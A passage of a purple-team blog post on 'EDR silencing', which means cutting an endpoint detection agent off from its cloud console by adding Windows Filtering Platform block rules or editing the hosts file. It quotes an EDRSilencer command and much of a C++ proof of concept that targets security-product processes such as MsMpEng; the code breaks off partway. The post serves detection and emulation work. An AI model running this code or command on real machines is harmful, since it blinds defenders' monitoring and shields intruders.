# https://ipurple.team/2026/01/12/edr-silencing/

<!DOCTYPE html><html lang="en">

<body class="wp-singular post-template-default single single-post postid-1608 single-format-standard wp-custom-logo wp-embed-responsive wp-theme-pubcreatio-2 is-block-theme customizer-styles-applied jetpack-reblog-enabled">

<a class="skip-link screen-reader-text" id="wp-skip-link" href="https://ipurple.team/2026/01/12/edr-silencing/#wp--skip-link--target">Skip to content</a><div class="wp-site-blocks">


<main class="wp-block-group is-layout-flow wp-container-core-group-is-layout-340ed61f wp-block-group-is-layout-flow" style="margin-top:var(--wp--preset--spacing--70);margin-bottom:var(--wp--preset--spacing--70)" id="wp--skip-link--target">
<div class="wp-block-group has-global-padding is-layout-constrained wp-container-core-group-is-layout-0481953d wp-block-group-is-layout-constrained"><div class="wp-block-template-part">
<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-group is-content-justification-center is-nowrap is-layout-flex wp-container-core-group-is-layout-356def60 wp-block-group-is-layout-flex">
<div class="wp-block-group has-tertiary-background-color has-background is-content-justification-center is-layout-flex wp-container-core-group-is-layout-a0cd93e3 wp-block-group-is-layout-flex" style="border-radius:4px"><div class="wp-block-template-part"><div style="font-size:0.8rem;padding-top:6px;padding-right:6px;padding-bottom:6px;padding-left:6px" class="taxonomy-category has-text-align-center wp-block-post-terms"><a href="https://ipurple.team/category/purple-team/" rel="tag">Purple Team</a></div></div></div>
</div>
</div>
</div>

<h2 class="has-text-align-center has-link-color alignwide wp-elements-f7145502cc31f04597e8620cb3ecaebe wp-block-post-title has-text-color has-secondary-color has-background has-primary-background-color has-xxx-large-font-size">EDR Silencing</h2>

<div class="wp-block-template-part">
<div class="wp-block-group is-content-justification-center is-nowrap is-layout-flex wp-container-core-group-is-layout-03bb3fbc wp-block-group-is-layout-flex" style="padding-bottom:20px;font-size:x-small">
<p class="has-x-small-font-size wp-block-paragraph">Published by</p>


<div class="wp-block-post-author has-x-small-font-size"><div class="wp-block-post-author__content"><p class="wp-block-post-author__name">Administrator</p></div></div>


<p class="has-x-small-font-size wp-block-paragraph">on</p>


<div class="wp-block-post-date"><a href="https://ipurple.team/2026/01/12/edr-silencing/"><time datetime="2026-01-12T16:52:25+02:00">January 12, 2026</time></a></div>


<p class="has-tertiary-color has-text-color has-link-color wp-elements-11b82c1452fbc825546826f6bdb4bca0 wp-block-paragraph"></p>
</div>
</div>

<figure class="wp-block-post-featured-image"><img width="1024" height="683" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-image.png?w=1024" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" style="object-fit:cover;" decoding="async" data-attachment-id="1611" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-image/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-image.png" data-orig-size="1536,1024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; Image" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-image.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-image.png?w=1024"></figure></div>



<div class="wp-block-group is-layout-flow wp-block-group-is-layout-flow"><div class="entry-content wp-elements-6a454feb9578be987e9b72ee76d63162 wp-block-post-content has-text-color has-tertiary-color has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
<p class="has-text-align-justify wp-block-paragraph">Modern Endpoint Detection and Response systems depend on persistent, bidirectional communication with their cloud management console, enabling them to continuously report suspicious activity and receive updated instructions or response actions. If that communication is disrupted, the EDR continues to collect telemetry locally, but it can no longer generate alerts to the cloud console. Threat actors can abuse the Windows Filtering Platform or modify local name resolution components such as the hosts files to block EDR agent outbound communication. This allows them to blind the EDR cloud visibility without triggering a service crash or process termination. Loss of visibility in the endpoints, constraints the ability of defensive security teams to detect and respond to threats. </p>



<p class="has-text-align-justify wp-block-paragraph">In 2023, MDSec has disclosed to the public that their internal team are taking a different approach to EDR Silencing as opposed to ransomware groups that were using kernel drivers to disrupt EDR communication. Their private tool FireBlock, leverages the Windows Filtering Platform to add rules and prevent egress traffic of the EDR agent. Based on this announcement similar proof of concepts have been developed by the information security community to emulate that behaviour.</p>



<h2 class="wp-block-heading">Playbook</h2>



<p class="has-text-align-justify wp-block-paragraph">Disrupting the communication channel between an EDR agent and its cloud management console, can extend significantly the duration of a security breach. Adversaries may exploit native Windows technologies and configuration files to achieve this outcome. Publicly available proof of concepts can emulate the behavior of EDR Silencing. Purple team operators should develop playbooks that incorporate multiple methods of execution to ensure broader coverage. It is important to note that modifications to block EDR communication require elevated privileges.</p>



<h3 class="wp-block-heading">Windows Filtering Platform</h3>



<p class="has-text-align-justify wp-block-paragraph">The Windows Filtering Platform was introduced in Windows Vista and provides a set of API’s and system services for processing, inspecting and filtering network traffic. It has been implemented by Microsoft as a replacement for older interfaces such as the Windows Firewall API and Transport Driver Interface (TDI), offering a more efficient and extensible way to implement network security features. EDR software utilise the functionality of Windows Filtering Platform to capture incoming and outbound network connections, contain assets from the network and provide data about processes making remote procedure calls. </p>



<p class="has-text-align-justify wp-block-paragraph"><a href="https://x.com/netero_1010">Chris Au</a> released a proof of concept in C, called <a href="https://github.com/netero1010/EDRSilencer/">EDRSilencer</a> that leverages a specific set of API’s to interact with the Windows Filtering Platform and apply rules that would prevent an EDR agent to make an outbound connection to its cloud management console. Specifically, the tool uses the <mark style="background-color:#6618b5;color:#ffffff" class="has-inline-color">FwpmFilterAdd0</mark> API to add a WFP filter:</p>



<pre class="wp-block-code"><code>EDRSilencer.exe blockedr</code></pre>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1616" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-edr-silencer/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-edr-silencer.png" data-orig-size="934,229" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing &amp;#8211; EDR Silencer" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-edr-silencer.png?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-edr-silencer.png?w=934" width="934" height="229" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-edr-silencer.png?w=934" alt="" class="wp-image-1616"><figcaption class="wp-element-caption"><em>EDR Silencer</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The diagram below demonstrates how the EDR Silencer tool operates under the hood to block EDR communication.</p>



<figure class="wp-block-image aligncenter size-large"><img data-attachment-id="1618" data-permalink="https://ipurple.team/2026/01/12/edr-silencing/edr-silencing-diagram/" data-orig-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-diagram.jpg" data-orig-size="3815,2358" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="EDR Silencing Diagram" data-image-description="" data-image-caption="" data-medium-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-diagram.jpg?w=300" data-large-file="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-diagram.jpg?w=1024" loading="lazy" width="1024" height="632" src="https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-diagram.jpg?w=1024" alt="" class="wp-image-1618"><figcaption class="wp-element-caption"><em>EDR Silencing – Diagram</em></figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">A similar proof of concept that uses the same API’s was released at the <a href="https://www.bordergate.co.uk/blocking-edr-traffic/">bordergate</a> website. The code below searches for processes that match the target executable names (brave, MsMpeng etc.) and uses the <strong>QueryProcessImageW</strong> API to obtain the full image path. The <mark style="background-color:#6618b5;color:#ffffff" class="has-inline-color">AddFilterForLayer</mark> function is utilised to create a new filter and calls the <mark style="background-color:#6618b5;color:#ffffff" class="has-inline-color">FwpmFilterAdd0</mark> to add the rules that will block the EDR agent communication. It should be noted that the code below doesn’t introduce a new method, and it has the same behavior as the EDRSilencer. Therefore, the same detection opportunities remain applicable. </p>


<div class="wp-block-syntaxhighlighter-code "><div><div id="highlighter_441050" class="syntaxhighlighter  cpp"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div><div class="line number125 index124 alt2">125</div><div class="line number126 index125 alt1">126</div><div class="line number127 index126 alt2">127</div><div class="line number128 index127 alt1">128</div><div class="line number129 index128 alt2">129</div><div class="line number130 index129 alt1">130</div><div class="line number131 index130 alt2">131</div><div class="line number132 index131 alt1">132</div><div class="line number133 index132 alt2">133</div><div class="line number134 index133 alt1">134</div><div class="line number135 index134 alt2">135</div><div class="line number136 index135 alt1">136</div><div class="line number137 index136 alt2">137</div><div class="line number138 index137 alt1">138</div><div class="line number139 index138 alt2">139</div><div class="line number140 index139 alt1">140</div><div class="line number141 index140 alt2">141</div><div class="line number142 index141 alt1">142</div><div class="line number143 index142 alt2">143</div><div class="line number144 index143 alt1">144</div><div class="line number145 index144 alt2">145</div><div class="line number146 index145 alt1">146</div><div class="line number147 index146 alt2">147</div><div class="line number148 index147 alt1">148</div><div class="line number149 index148 alt2">149</div><div class="line number150 index149 alt1">150</div><div class="line number151 index150 alt2">151</div><div class="line number152 index151 alt1">152</div><div class="line number153 index152 alt2">153</div><div class="line number154 index153 alt1">154</div><div class="line number155 index154 alt2">155</div><div class="line number156 index155 alt1">156</div><div class="line number157 index156 alt2">157</div><div class="line number158 index157 alt1">158</div><div class="line number159 index158 alt2">159</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp comments">// BlockEDRTraffic.cpp</code></div><div class="line number2 index1 alt1"><code class="cpp preprocessor">#include &lt;windows.h&gt;</code></div><div class="line number3 index2 alt2"><code class="cpp preprocessor">#include &lt;fwpmu.h&gt;</code></div><div class="line number4 index3 alt1"><code class="cpp preprocessor">#include &lt;tlhelp32.h&gt;</code></div><div class="line number5 index4 alt2"><code class="cpp preprocessor">#include &lt;stdio.h&gt;</code></div><div class="line number6 index5 alt1"><code class="cpp preprocessor">#include &lt;vector&gt;</code></div><div class="line number7 index6 alt2"><code class="cpp preprocessor">#include &lt;string&gt;</code></div><div class="line number8 index7 alt1">&nbsp;</div><div class="line number9 index8 alt2"><code class="cpp preprocessor">#pragma comment(lib, "fwpuclnt.lib")</code></div><div class="line number10 index9 alt1"><code class="cpp preprocessor">#pragma comment(lib, "rpcrt4.lib")</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="cpp keyword bold">void</code> <code class="cpp plain">DisplayError(</code><code class="cpp keyword bold">const</code> <code class="cpp color1 bold">char</code><code class="cpp plain">* msg, </code><code class="cpp color1 bold">DWORD</code> <code class="cpp plain">err)</code></div><div class="line number13 index12 alt2"><code class="cpp plain">{</code></div><div class="line number14 index13 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"%s failed (0x%08lx)\n"</code><code class="cpp plain">, msg, err);</code></div><div class="line number15 index14 alt2"><code class="cpp plain">}</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="cpp color1 bold">BOOL</code> <code class="cpp plain">FindProcessPath(</code><code class="cpp keyword bold">const</code> <code class="cpp color1 bold">wchar_t</code><code class="cpp plain">* targetName, std::vector&lt;std::wstring&gt;&amp; results)</code></div><div class="line number18 index17 alt1"><code class="cpp plain">{</code></div><div class="line number19 index18 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">HANDLE</code> <code class="cpp plain">snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</code></div><div class="line number20 index19 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(snapshot == INVALID_HANDLE_VALUE)</code></div><div class="line number21 index20 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code> <code class="cpp plain">FALSE;</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">PROCESSENTRY32W pe32;</code></div><div class="line number24 index23 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">pe32.dwSize = </code><code class="cpp keyword bold">sizeof</code><code class="cpp plain">(pe32);</code></div><div class="line number25 index24 alt2">&nbsp;</div><div class="line number26 index25 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(!Process32FirstW(snapshot, &amp;pe32)) {</code></div><div class="line number27 index26 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">CloseHandle(snapshot);</code></div><div class="line number28 index27 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code> <code class="cpp plain">FALSE;</code></div><div class="line number29 index28 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number30 index29 alt1">&nbsp;</div><div class="line number31 index30 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">do</code> <code class="cpp plain">{</code></div><div class="line number32 index31 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(_wcsicmp(pe32.szExeFile, targetName) == 0)</code></div><div class="line number33 index32 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number34 index33 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">HANDLE</code> <code class="cpp plain">hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);</code></div><div class="line number35 index34 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(hProcess) {</code></div><div class="line number36 index35 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">wchar_t</code> <code class="cpp plain">path[MAX_PATH];</code></div><div class="line number37 index36 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">DWORD</code> <code class="cpp plain">size = MAX_PATH;</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(QueryFullProcessImageNameW(hProcess, 0, path, &amp;size)) {</code></div><div class="line number40 index39 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">results.push_back(path);</code></div><div class="line number41 index40 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number42 index41 alt1">&nbsp;</div><div class="line number43 index42 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">CloseHandle(hProcess);</code></div><div class="line number44 index43 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number45 index44 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number46 index45 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">} </code><code class="cpp keyword bold">while</code> <code class="cpp plain">(Process32NextW(snapshot, &amp;pe32));</code></div><div class="line number47 index46 alt2">&nbsp;</div><div class="line number48 index47 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">CloseHandle(snapshot);</code></div><div class="line number49 index48 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code> <code class="cpp plain">!results.empty();</code></div><div class="line number50 index49 alt1"><code class="cpp plain">}</code></div><div class="line number51 index50 alt2">&nbsp;</div><div class="line number52 index51 alt1"><code class="cpp color1 bold">DWORD</code> <code class="cpp plain">AddFilterForLayer(</code></div><div class="line number53 index52 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">HANDLE</code> <code class="cpp plain">engine,</code></div><div class="line number54 index53 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWP_BYTE_BLOB* appId,</code></div><div class="line number55 index54 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">const</code> <code class="cpp plain">GUID* layerKey,</code></div><div class="line number56 index55 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">UINT64</code><code class="cpp plain">* filterIdOut)</code></div><div class="line number57 index56 alt2"><code class="cpp plain">{</code></div><div class="line number58 index57 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWPM_FILTER_CONDITION cond = { 0 };</code></div><div class="line number59 index58 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;</code></div><div class="line number60 index59 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.matchType = FWP_MATCH_EQUAL;</code></div><div class="line number61 index60 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;</code></div><div class="line number62 index61 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">cond.conditionValue.byteBlob = appId;</code></div><div class="line number63 index62 alt2">&nbsp;</div><div class="line number64 index63 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">FWPM_FILTER filter = { 0 };</code></div><div class="line number65 index64 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.layerKey = *layerKey;</code></div><div class="line number66 index65 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.displayData.name = _wcsdup(</code><code class="cpp string">L"EDR Traffic Block"</code><code class="cpp plain">);</code></div><div class="line number67 index66 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.displayData.description = _wcsdup(</code><code class="cpp string">L"Blocks EDR traffic"</code><code class="cpp plain">);</code></div><div class="line number68 index67 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.action.type = FWP_ACTION_BLOCK;</code></div><div class="line number69 index68 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.filterCondition = &amp;cond;</code></div><div class="line number70 index69 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.numFilterConditions = 1;</code></div><div class="line number71 index70 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.subLayerKey = FWPM_SUBLAYER_UNIVERSAL;</code></div><div class="line number72 index71 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">filter.weight.type = FWP_EMPTY;</code></div><div class="line number73 index72 alt2">&nbsp;</div><div class="line number74 index73 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code> <code class="cpp plain">FwpmFilterAdd0(engine, &amp;filter, NULL, filterIdOut);</code></div><div class="line number75 index74 alt2"><code class="cpp plain">}</code></div><div class="line number76 index75 alt1">&nbsp;</div><div class="line number77 index76 alt2">&nbsp;</div><div class="line number78 index77 alt1"><code class="cpp color1 bold">int</code> <code class="cpp plain">main()</code></div><div class="line number79 index78 alt2"><code class="cpp plain">{</code></div><div class="line number80 index79 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">DWORD</code> <code class="cpp plain">result;</code></div><div class="line number81 index80 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">HANDLE</code> <code class="cpp plain">engine = NULL;</code></div><div class="line number82 index81 alt1">&nbsp;</div><div class="line number83 index82 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">// Open WFP engine</code></div><div class="line number84 index83 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &amp;engine);</code></div><div class="line number85 index84 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code> <code class="cpp plain">(result != ERROR_SUCCESS) {</code></div><div class="line number86 index85 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">DisplayError(</code><code class="cpp string">"FwpmEngineOpen0"</code><code class="cpp plain">, result);</code></div><div class="line number87 index86 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code> <code class="cpp plain">1;</code></div><div class="line number88 index87 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number89 index88 alt2">&nbsp;</div><div class="line number90 index89 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"WFP engine opened.\n"</code><code class="cpp plain">);</code></div><div class="line number91 index90 alt2">&nbsp;</div><div class="line number92 index91 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">const</code> <code 